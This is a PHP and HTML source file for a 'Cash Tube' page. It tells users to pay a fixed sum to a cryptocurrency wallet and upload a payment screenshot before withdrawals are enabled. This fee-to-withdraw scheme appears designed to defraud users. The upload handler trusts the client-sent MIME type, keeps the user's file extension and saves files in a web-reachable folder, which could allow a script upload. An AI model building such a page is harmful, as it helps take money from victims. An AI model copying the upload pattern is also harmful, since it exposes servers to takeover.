<?php
session_start();
require_once '../database/conn.php';

// Check if user is logged in
if (!isset($_SESSION['user_id'])) {
    header('Location: ../signin.php');
    exit;
}

// Fetch user verification status and details
try {
    $stmt = $pdo->prepare("SELECT name, email, verification_status FROM users WHERE id = ?");
    $stmt->execute([$_SESSION['user_id']]);
    $user = $stmt->fetch(PDO::FETCH_ASSOC);
    if (!$user) {
        session_destroy();
        header('Location: ../signin.php');
        exit;
    }
    $username = htmlspecialchars($user['name']);
    $email = htmlspecialchars($user['email']);
    $verification_status = $user['verification_status'];
} catch (PDOException $e) {
    error_log('Database error: ' . $e->getMessage(), 3, '../debug.log');
    header('Location: ../signin.php?error=database');
    exit;
}

// Fetch dynamic amount and wallet address from region_settings
try {
    $stmt = $pdo->prepare("SELECT amount, wallet_address FROM region_settings LIMIT 1");
    $stmt->execute();
    $settings = $stmt->fetch(PDO::FETCH_ASSOC);
    if (!$settings) {
        $error = 'Settings not found. Please contact support.';
        $amount = 0.00;
        $wallet_address = '';
    } else {
        $amount = $settings['amount'];
        $wallet_address = htmlspecialchars($settings['wallet_address']);
    }
} catch (PDOException $e) {
    error_log('Settings fetch error: ' . $e->getMessage(), 3, '../debug.log');
    $error = 'Failed to load verification settings.';
    $amount = 0.00;
    $wallet_address = '';
}

// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $proof_file = $_FILES['proof_file'] ?? null;

    if (!$proof_file || $proof_file['error'] === UPLOAD_ERR_NO_FILE) {
        $error = 'Please upload a payment proof file.';
    } else {
        // Validate file
        $allowed_types = ['image/jpeg', 'image/png', 'application/pdf'];
        $max_size = 5 * 1024 * 1024; // 5MB
        if (!in_array($proof_file['type'], $allowed_types) || $proof_file['size'] > $max_size) {
            $error = 'Invalid file type or size. Please upload a JPG, PNG, or PDF file (max 5MB).';
        } else {
            // Create upload directory if it doesn't exist
            $upload_dir = '../users/proofs/';
            if (!is_dir($upload_dir)) {
                mkdir($upload_dir, 0755, true);
            }

            // Generate a unique filename to prevent overwrites
            $file_ext = pathinfo($proof_file['name'], PATHINFO_EXTENSION);
            $file_name = 'proof_' . $_SESSION['user_id'] . '_' . time() . '.' . $file_ext;
            $upload_path = $upload_dir . $file_name;

            if (move_uploaded_file($proof_file['tmp_name'], $upload_path)) {
                try {
                    // Start transaction
                    $pdo->beginTransaction();

                    // Update verification status to 'pending'
                    $stmt = $pdo->prepare("UPDATE users SET verification_status = 'pending' WHERE id = ?");
                    $stmt->execute([$_SESSION['user_id']]);

                    // Insert into verification_requests table
                    $stmt = $pdo->prepare("
                        INSERT INTO verification_requests (user_id, payment_amount, name, email, upload_path, file_name, status)
                        VALUES (?, ?, ?, ?, ?, ?, 'pending')
                    ");
                    $stmt->execute([$_SESSION['user_id'], $amount, $username, $email, $upload_path, $file_name]);

                    // Commit transaction
                    $pdo->commit();

                    header('Location: home.php?success=Verification+request+submitted+successfully');
                    exit;
                } catch (PDOException $e) {
                    $pdo->rollBack();
                    error_log('Verification error: ' . $e->getMessage(), 3, '../debug.log');
                    $error = 'An error occurred while submitting your verification request.';
                    // Delete the uploaded file if database operation fails
                    if (file_exists($upload_path)) {
                        unlink($upload_path);
                    }
                }
            } else {
                $error = 'Failed to upload proof file.';
            }
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="description" content="Verify your Cash Tube account to enable withdrawals." />
  <meta name="keywords" content="Cash Tube, verify account, cryptocurrency" />
  <meta name="author" content="Cash Tube" />
  <title>Verify Account | Cash Tube</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  <style>
    :root {
      --bg-color: #f7f9fc;
      --gradient-bg: linear-gradient(135deg, #f7f9fc, #e5e7eb);
      --card-bg: #ffffff;
      --text-color: #1a1a1a;
      --subtext-color: #6b7280;
      --border-color: #d1d5db;
      --shadow-color: rgba(0, 0, 0, 0.1);
      --accent-color: #22c55e;
      --accent-hover: #16a34a;
      --menu-bg: #1a1a1a;
      --menu-text: #ffffff;
    }

    [data-theme="dark"] {
      --bg-color: #1f2937;
      --gradient-bg: linear-gradient(135deg, #1f2937, #374151);
      --card-bg: #2d3748;
      --text-color: #e5e7eb;
      --subtext-color: #9ca3af;
      --border-color: #4b5563;
      --shadow-color: rgba(0, 0, 0, 0.3);
      --accent-color: #34d399;
      --accent-hover: #22c55e;
      --menu-bg: #111827;
      --menu-text: #e5e7eb;
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Inter', sans-serif;
    }

    body {
      background: var(--bg-color);
      color: var(--text-color);
      min-height: 100vh;
      padding-bottom: 100px;
      transition: all 0.3s ease;
    }

    .container {
      max-width: 1200px;
      margin: 0 auto;
      padding: 24px;
      position: relative;
    }

    .header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 24px 0;
      animation: slideIn 0.5s ease-out;
    }

    .header img {
      width: 64px;
      height: 64px;
      margin-right: 16px;
      border-radius: 8px;
    }

    .header-text h1 {
      font-size: 26px;
      font-weight: 700;
    }

    .header-text p {
      font-size: 16px;
      color: var(--subtext-color);
      margin-top: 4px;
    }

    .theme-toggle {
      background: var(--accent-color);
      color: #fff;
      border: none;
      padding: 8px 16px;
      border-radius: 8px;
      cursor: pointer;
      font-size: 14px;
      font-weight: 500;
      transition: background 0.3s ease, transform 0.2s ease;
    }

    .theme-toggle:hover {
      background: var(--accent-hover);
      transform: scale(1.02);
    }

    .form-card {
      background: var(--card-bg);
      border-radius: 16px;
      padding: 28px;
      box-shadow: 0 6px 16px var(--shadow-color);
      margin: 24px 0;
      animation: slideIn 0.5s ease-out 0.6s backwards;
    }

    .form-card h2 {
      font-size: 24px;
      margin-bottom: 20px;
      text-align: center;
    }

    .form-card h2::before {
      content: '🔒';
      font-size: 1.2rem;
      margin-right: 8px;
    }

    .instructions {
      margin-bottom: 20px;
      font-size: 16px;
      color: var(--subtext-color);
    }

    .instructions strong {
      color: var(--text-color);
    }

    .input-container {
      position: relative;
      margin-bottom: 28px;
    }

    .input-container input,
    .input-container input[type="file"] {
      width: 100%;
      padding: 14px 0;
      font-size: 16px;
      border: none;
      border-bottom: 2px solid var(--border-color);
      background: transparent;
      color: var(--text-color);
      outline: none;
      transition: border-color 0.3s ease;
    }

    .input-container input:focus,
    .input-container input:valid {
      border-bottom-color: var(--accent-color);
    }

    .input-container label {
      position: absolute;
      top: 14px;
      left: 0;
      font-size: 16px;
      color: var(--subtext-color);
      pointer-events: none;
      transition: all 0.3s ease;
    }

    .input-container input:focus ~ label,
    .input-container input:valid ~ label {
      top: -18px;
      font-size: 12px;
      color: var(--accent-color);
    }

    .submit-btn {
      width: 100%;
      padding: 14px;
      background: var(--accent-color);
      color: #fff;
      font-size: 16px;
      font-weight: 600;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background 0.3s ease, transform 0.2s ease;
    }

    .submit-btn:hover {
      background: var(--accent-hover);
      transform: scale(1.02);
    }

    .error {
      text-align: center;
      color: red;
      margin-bottom: 20px;
      font-size: 14px;
    }

    .success {
      text-align: center;
      color: var(--accent-color);
      margin-bottom: 20px;
      font-size: 14px;
    }

    .notification {
      position: fixed;
      top: 20px;
      right: 20px;
      background: var(--card-bg);
      color: var(--text-color);
      padding: 16px 24px;
      border-radius: 12px;
      border: 2px solid var(--accent-color);
      box-shadow: 0 4px 12px var(--shadow-color), 0 0 8px var(--accent-color);
      z-index: 1000;
      display: flex;
      align-items: center;
      animation: slideInRight 0.5s ease-out, fadeOut 0.5s ease-out 3s forwards;
      max-width: 300px;
      transition: transform 0.2s ease;
    }

    .notification:hover {
      transform: scale(1.05);
    }

    .notification::before {
      content: '🔒';
      font-size: 1.2rem;
      margin-right: 12px;
      color: var(--accent-color);
    }

    .notification span {
      font-size: 14px;
      font-weight: 500;
    }

    @keyframes slideInRight {
      from {
        opacity: 0;
        transform: translateX(100px);
      }
      to {
        opacity: 1;
        transform: translateX(0);
      }
    }

    @keyframes fadeOut {
      to {
        opacity: 0;
        transform: translateY(-20px);
      }
    }

    .bottom-menu {
      position: fixed;
      bottom: 0;
      left: 0;
      width: 100%;
      background: var(--menu-bg);
      display: flex;
      justify-content: space-around;
      align-items: center;
      padding: 14px 0;
      box-shadow: 0 -2px 8px var(--shadow-color);
    }

    .bottom-menu a,
    .bottom-menu button {
      color: var(--menu-text);
      text-decoration: none;
      font-size: 14px;
      font-weight: 500;
      padding: 10px 18px;
      transition: color 0.3s ease;
      background: none;
      border: none;
      cursor: pointer;
    }

    .bottom-menu a.active,
    .bottom-menu a:hover,
    .bottom-menu button:hover {
      color: var(--accent-color);
    }

    #gradient {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: -1;
      background: var(--gradient-bg);
      transition: all 0.3s ease;
    }

    @keyframes slideIn {
      from {
        opacity: 0;
        transform: translateY(20px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    @media (max-width: 768px) {
      .container {
        padding: 16px;
      }

      .header-text h1 {
        font-size: 22px;
      }

      .form-card {
        padding: 20px;
      }

      .notification {
        max-width: 250px;
        right: 10px;
        top: 10px;
      }
    }
  </style>
</head>
<body>
  <div id="gradient"></div>
  <div class="container" role="main">
    <div class="header">
      <div style="display: flex; align-items: center;">
        <img src="img/top.png" alt="Cash Tube Logo" aria-label="Cash Tube Logo">
        <div class="header-text">
          <h1>Verify Account</h1>
          <p>Complete verification to enable withdrawals</p>
        </div>
      </div>
      <button class="theme-toggle" id="themeToggle" aria-label="Toggle theme">Toggle Dark Mode</button>
    </div>

    <div class="form-card">
      <h2>Account Verification</h2>
      <?php if ($verification_status === 'verified'): ?>
        <p class="success">Your account is already verified!</p>
        <p style="text-align: center;"><a href="home.php">Return to Dashboard</a></p>
      <?php elseif ($verification_status === 'pending'): ?>
        <p class="success">Your verification request is pending review.</p>
        <p style="text-align: center;"><a href="home.php">Return to Dashboard</a></p>
      <?php else: ?>
        <?php if (isset($error)): ?>
          <p class="error"><?php echo htmlspecialchars($error); ?></p>
        <?php endif; ?>
        <div class="instructions">
          <p>To verify your account, please make a payment of <strong>$<?php echo number_format($amount, 2); ?></strong> to the following wallet address:</p>
          <p><strong>Wallet Address:</strong> <?php echo $wallet_address; ?></p>
          <p>After making the payment, upload a screenshot or proof of payment below. Your request will be reviewed, and your account status will be updated to pending.</p>
          <p><strong>Important:</strong></p>
          <ul>
            <li>Ensure the payment is made from your wallet.</li>
            <li>Use the exact amount specified ($<?php echo number_format($amount, 2); ?>).</li>
            <li>Upload a clear screenshot or PDF showing the transaction details (e.g., sender, receiver, amount, timestamp).</li>
            <li>Supported file types: JPG, PNG, PDF (max size: 5MB).</li>
            <li>Verification may take up to 48 hours.</li>
          </ul>
        </div>
        <form action="verify_account.php" method="POST" enctype="multipart/form-data">
          <div class="input-container">
            <input type="file" id="proof_file" name="proof_file" accept=".jpg,.jpeg,.png,.pdf" required>
            <label for="proof_file">Upload Payment Proof</label>
          </div>
          <button type="submit" class="submit-btn">Submit Verification</button>
        </form>
        <p style="text-align: center; margin-top: 20px;"><a href="home.php">Return to Dashboard</a></p>
      <?php endif; ?>
    </div>

    <div id="notificationContainer"></div>
  </div>

  <div class="bottom-menu" role="navigation">
    <a href="home.php" class="active">Home</a>
    <a href="profile.php">Profile</a>
    <a href="history.php">History</a>
    <a href="support.php">Support</a>
    <button id="logoutBtn" aria-label="Log out">Logout</button>
  </div>

  <script>
    window.__lc = window.__lc || {};
    window.__lc.license = 15808029;
    (function(n, t, c) {
      function i(n) { return e._h ? e._h.apply(null, n) : e._q.push(n) }
      var e = {
        _q: [], _h: null, _v: "2.0",
        on: function() { i(["on", c.call(arguments)]) },
        once: function() { i(["once", c.call(arguments)]) },
        off: function() { i(["off", c.call(arguments)]) },
        get: function() { if (!e._h) throw new Error("[LiveChatWidget] You can't use getters before load."); return i(["get", c.call(arguments)]) },
        call: function() { i(["call", c.call(arguments)]) },
        init: function() {
          var n = t.createElement("script");
          n.async = true;
          n.type = "text/javascript";
          n.src = "https://cdn.livechatinc.com/tracking.js";
          t.head.appendChild(n);
        }
      };
      !n.__lc.asyncInit && e.init();
      n.LiveChatWidget = n.LiveChatWidget || e;
    })(window, document, [].slice);
  </script>
  <noscript>
    <a href="https://www.livechat.com/chat-with/15808029/" rel="nofollow">Chat with us</a>, 
    powered by <a href="https://www.livechat.com/?welcome" rel="noopener nofollow" target="_blank">LiveChat</a>
  </noscript>

  <script>
    // Dark Mode Toggle
    const themeToggle = document.getElementById('themeToggle');
    const body = document.body;
    const currentTheme = localStorage.getItem('theme') || 'light';
    if (currentTheme === 'dark') {
      body.setAttribute('data-theme', 'dark');
      themeToggle.textContent = 'Toggle Light Mode';
    }

    themeToggle.addEventListener('click', () => {
      const isDark = body.getAttribute('data-theme') === 'dark';
      body.setAttribute('data-theme', isDark ? 'light' : 'dark');
      themeToggle.textContent = isDark ? 'Toggle Dark Mode' : 'Toggle Light Mode';
      localStorage.setItem('theme', isDark ? 'light' : 'dark');
    });

    // Menu interactions
    const menuItems = document.querySelectorAll('.bottom-menu a');
    menuItems.forEach((item) => {
      item.addEventListener('click', () => {
        menuItems.forEach((menuItem) => {
          menuItem.classList.remove('active');
        });
        item.classList.add('active');
      });
    });

    // Logout Button
    document.getElementById('logoutBtn').addEventListener('click', () => {
      Swal.fire({
        title: 'Log out?',
        text: 'Are you sure you want to log out?',
        icon: 'question',
        showCancelButton: true,
        confirmButtonColor: '#22c55e',
        cancelButtonColor: '#d33',
        confirmButtonText: 'Yes, log out'
      }).then((result) => {
        if (result.isConfirmed) {
          $.ajax({
            url: 'logout.php',
            type: 'POST',
            dataType: 'json',
            success: function(response) {
              if (response.success) {
                window.location.href = '../signin.php';
              } else {
                Swal.fire({
                  icon: 'error',
                  title: 'Error',
                  text: 'Failed to log out. Please try again.'
                });
              }
            },
            error: function() {
              Swal.fire({
                icon: 'error',
                title: 'Server Error',
                text: 'An error occurred while logging out.'
              });
            }
          });
        }
      });
    });

    // Notification Handling
    const notificationContainer = document.getElementById('notificationContainer');
    function fetchNotifications() {
      $.ajax({
        url: 'fetch_notifications.php',
        type: 'GET',
        dataType: 'json',
        success: function(notifications) {
          notifications.forEach((message, index) => {
            const notification = document.createElement('div');
            notification.className = 'notification';
            notification.setAttribute('role', 'alert');
            notification.innerHTML = `<span>${message}</span>`;
            notificationContainer.appendChild(notification);
            notification.style.top = `${20 + index * 80}px`;
            setTimeout(() => notification.remove(), 3500);
          });
        },
        error: function() {
          console.error('Failed to fetch notifications');
        }
      });
    }

    fetchNotifications();
    setInterval(fetchNotifications, 20000);

    // Gradient Animation
    var colors = [
      [62, 35, 255],
      [60, 255, 60],
      [255, 35, 98],
      [45, 175, 230],
      [255, 0, 255],
      [255, 128, 0]
    ];
    var step = 0;
    var colorIndices = [0, 1, 2, 3];
    var gradientSpeed = 0.002;
    const gradientElement = document.getElementById('gradient');

    function updateGradient() {
      var c0_0 = colors[colorIndices[0]];
      var c0_1 = colors[colorIndices[1]];
      var c1_0 = colors[colorIndices[2]];
      var c1_1 = colors[colorIndices[3]];
      var istep = 1 - step;
      var r1 = Math.round(istep * c0_0[0] + step * c0_1[0]);
      var g1 = Math.round(istep * c0_0[1] + step * c0_1[1]);
      var b1 = Math.round(istep * c0_0[2] + step * c0_1[2]);
      var color1 = `rgb(${r1},${g1},${b1})`;
      var r2 = Math.round(istep * c1_0[0] + step * c1_1[0]);
      var g2 = Math.round(istep * c1_0[1] + step * c1_1[1]);
      var b2 = Math.round(istep * c1_0[2] + step * c1_1[2]);
      var color2 = `rgb(${r2},${g2},${b2})`;
      gradientElement.style.background = `linear-gradient(135deg, ${color1}, ${color2})`;
      step += gradientSpeed;
      if (step >= 1) {
        step %= 1;
        colorIndices[0] = colorIndices[1];
        colorIndices[2] = colorIndices[3];
        colorIndices[1] = (colorIndices[1] + Math.floor(1 + Math.random() * (colors.length - 1))) % colors.length;
        colorIndices[3] = (colorIndices[3] + Math.floor(1 + Math.random() * (colors.length - 1))) % colors.length;
      }
      requestAnimationFrame(updateGradient);
    }

    requestAnimationFrame(updateGradient);

    // Context Menu Disable
    document.addEventListener('contextmenu', function(event) {
      event.preventDefault();
    });
  </script>
</body>
</html>
